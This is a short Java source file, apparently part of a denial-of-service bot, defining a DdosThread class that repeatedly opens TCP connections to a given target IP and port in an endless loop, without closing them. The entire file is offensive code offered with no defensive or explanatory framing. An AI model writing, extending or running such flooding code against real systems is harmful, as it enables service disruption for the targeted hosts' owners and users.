package com.example.dos_bot;

import java.io.IOException;
import java.net.Socket;
import java.util.concurrent.atomic.AtomicBoolean;

public  class DdosThread extends Thread{
    private final AtomicBoolean running = new AtomicBoolean(true);
    private final String targetIp;
    private final int port;

    public DdosThread(String targetIp, int port) {
        this.targetIp  = targetIp;
        this.port = port;
    }

    @Override
    public void run() {
        while (running.get()) {
            try {
                Socket socket = new Socket(targetIp, port);
            } catch (IOException e) {
                System.out.println("Error : " + e.getMessage());
                e.printStackTrace();
            }
        }
    }
}
